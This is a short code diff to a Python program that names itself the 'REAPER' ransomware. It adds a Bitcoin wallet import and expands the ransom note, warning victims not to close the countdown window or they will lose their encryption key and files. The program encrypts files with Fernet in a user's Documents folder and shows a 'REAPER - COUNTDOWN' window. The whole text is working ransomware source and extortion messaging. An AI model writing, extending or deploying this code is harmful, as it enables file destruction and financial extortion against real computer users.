@@ -2,6 +2,7 @@
 from cryptography.fernet import Fernet
 import os,sys,json,time
 from tkinter import *
+from bitcoinlib.wallets import Wallet
 
 # Variables
 DIR = "C:/Users/krist/Documents/beatmaker"
@@ -27,6 +28,12 @@ banner = f"""
 {COLORS["white"]}"""
 RANSOM_TEXT = """ 
 This is the REAPER ransomware.
+
+DO NOT CLOSE THIS WINDOW!
+Once the window is closed, the program stopped or 
+the computer powered off you will not be able to send 
+the Bitcoin which will result in you not getting the 
+encryption key and the files back.
 
 Pay for the ransom to be removed.
 The payment must be in Bitcoin.
@@ -124,7 +131,7 @@ class TimerWindow():
     # Window
     self.root = Tk()
     self.root.resizable(False,False)
-    self.root.geometry("700x700")
+    self.root.geometry("800x800")
     self.root.title("REAPER - COUNTDOWN")
     self.root.configure(bg="black")
     # Reaper text
